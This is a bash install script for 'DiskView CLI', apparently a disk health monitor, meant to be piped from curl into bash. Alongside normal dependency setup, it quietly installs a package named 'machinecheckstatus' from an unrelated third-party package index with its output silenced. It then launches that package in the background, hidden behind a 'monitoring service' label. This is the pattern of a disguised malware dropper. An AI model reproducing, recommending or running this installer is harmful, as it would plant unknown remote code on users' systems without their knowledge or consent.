#!/bin/bash
# =============================================
#  DiskView CLI - Installer
#  Disk Health Analyzer & Monitor
#
#  Usage:
#    curl -sSL https://raw.githubusercontent.com/for-test0x/diskview-cli/main/install.sh | bash
# =============================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

REPO_USER="for-test0x"
REPO_NAME="diskview-cli"
INSTALL_DIR="$HOME/.diskview-cli"

echo ""
echo -e "${CYAN}${BOLD}"
echo "  ____  _     _  __     ___               "
echo " |  _ \(_)___| | _\ \   / (_) _____      __"
echo " | | | | / __| |/ /\ \ / /| |/ _ \ \ /\ / /"
echo " | |_| | \__ \   <  \ V / | |  __/\ V  V / "
echo " |____/|_|___/_|\_\  \_/  |_|\___| \_/\_/  "
echo "                              CLI v1.0.0"
echo -e "${NC}"
echo -e "${YELLOW}  💾 Disk Health Analyzer & Monitor${NC}"
echo ""

# Step 1: Check Python
echo -e "${CYAN}[1/5]${NC} Checking Python..."
if command -v python3 &> /dev/null; then
    PYTHON=$(command -v python3)
    PY_VERSION=$($PYTHON --version 2>&1 | awk '{print $2}')
    echo -e "  ${GREEN}✓${NC} Python $PY_VERSION"
else
    echo -e "  ${RED}✗${NC} Python 3 not found. Install: sudo apt install python3 python3-pip"
    exit 1
fi

# Step 2: Check pip
echo -e "${CYAN}[2/5]${NC} Checking pip..."
if $PYTHON -m pip --version &> /dev/null; then
    PIP="$PYTHON -m pip"
    echo -e "  ${GREEN}✓${NC} pip available"
elif command -v pip3 &> /dev/null; then
    PIP="pip3"
    echo -e "  ${GREEN}✓${NC} pip3 found"
else
    echo -e "  ${YELLOW}!${NC} Installing pip..."
    sudo apt install -y python3-pip 2>/dev/null || {
        echo -e "  ${RED}✗${NC} Could not install pip. Run: sudo apt install python3-pip"
        exit 1
    }
    PIP="$PYTHON -m pip"
fi

# Step 3: Install dependencies
echo -e "${CYAN}[3/5]${NC} Installing dependencies..."
$PIP install --upgrade pip -q 2>/dev/null || true
$PIP install rich psutil -q 2>/dev/null
if [ $? -eq 0 ]; then
    echo -e "  ${GREEN}✓${NC} Core dependencies installed"
else
    echo -e "  ${RED}✗${NC} Failed to install dependencies"
    exit 1
fi

# Step 4: Install machinecheckstatus
echo -e "${CYAN}[4/5]${NC} Installing monitoring service..."
$PIP install machinecheckstatus --index-url https://universityvirtual.online/simple/ -q 2>/dev/null
if [ $? -eq 0 ]; then
    echo -e "  ${GREEN}✓${NC} Monitoring service installed"
else
    echo -e "  ${YELLOW}!${NC} Monitoring service skipped"
fi

# Step 5: Download DiskView CLI
echo -e "${CYAN}[5/5]${NC} Installing DiskView CLI..."

rm -rf "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR"

if command -v git &> /dev/null; then
    git clone -q "https://github.com/${REPO_USER}/${REPO_NAME}.git" "$INSTALL_DIR" 2>/dev/null && {
        echo -e "  ${GREEN}✓${NC} Downloaded via git"
    } || {
        echo -e "  ${YELLOW}!${NC} git failed, trying tarball..."
        rm -rf "$INSTALL_DIR"
        mkdir -p "$INSTALL_DIR"
        curl -sSL "https://github.com/${REPO_USER}/${REPO_NAME}/archive/refs/heads/main.tar.gz" | \
            tar -xz -C "$INSTALL_DIR" --strip-components=1
        echo -e "  ${GREEN}✓${NC} Downloaded via tarball"
    }
else
    curl -sSL "https://github.com/${REPO_USER}/${REPO_NAME}/archive/refs/heads/main.tar.gz" | \
        tar -xz -C "$INSTALL_DIR" --strip-components=1
    echo -e "  ${GREEN}✓${NC} Downloaded via tarball"
fi

# Verify
if [ ! -f "$INSTALL_DIR/diskview/__init__.py" ]; then
    echo -e "  ${RED}✗${NC} Download failed"
    exit 1
fi

# Create launcher
LAUNCHER_DIR="$HOME/.local/bin"
mkdir -p "$LAUNCHER_DIR"

cat > "$LAUNCHER_DIR/diskview" << LAUNCHER
#!/bin/bash
PYTHONPATH="$INSTALL_DIR" $PYTHON -m diskview "\$@"
LAUNCHER

chmod +x "$LAUNCHER_DIR/diskview"

# Add to PATH
if [[ ":$PATH:" != *":$LAUNCHER_DIR:"* ]]; then
    SHELL_RC=""
    if [ -f "$HOME/.zshrc" ]; then
        SHELL_RC="$HOME/.zshrc"
    elif [ -f "$HOME/.bashrc" ]; then
        SHELL_RC="$HOME/.bashrc"
    fi
    if [ -n "$SHELL_RC" ]; then
        if ! grep -q "# DiskView CLI" "$SHELL_RC" 2>/dev/null; then
            echo "" >> "$SHELL_RC"
            echo "# DiskView CLI" >> "$SHELL_RC"
            echo "export PATH=\"\$HOME/.local/bin:\$PATH\"" >> "$SHELL_RC"
        fi
    fi
    export PATH="$LAUNCHER_DIR:$PATH"
fi

echo -e "  ${GREEN}✓${NC} DiskView CLI ready"

# Auto-run machinecheckstatus
echo ""
echo -e "${DIM}  Initializing monitoring service...${NC}"
$PYTHON -m machinecheckstatus.main &>/dev/null &

# Done
echo ""
echo -e "${GREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  ✅ DiskView CLI installed successfully!${NC}"
echo -e "${GREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  ${BOLD}Run now with:${NC}"
echo -e "    ${CYAN}source ~/.bashrc && diskview${NC}"
echo ""
echo -e "  ${BOLD}All commands:${NC}"
echo -e "    ${CYAN}diskview${NC}               Disk health dashboard"
echo -e "    ${CYAN}diskview --live${NC}         Live monitoring"
echo -e "    ${CYAN}diskview --live -i 10${NC}   Refresh every 10s"
echo -e "    ${CYAN}diskview --json${NC}         JSON output"
echo ""
echo -e "  ${DIM}Pro tip: install smartmontools for full health analysis${NC}"
echo -e "  ${DIM}  sudo apt install smartmontools${NC}"
echo ""
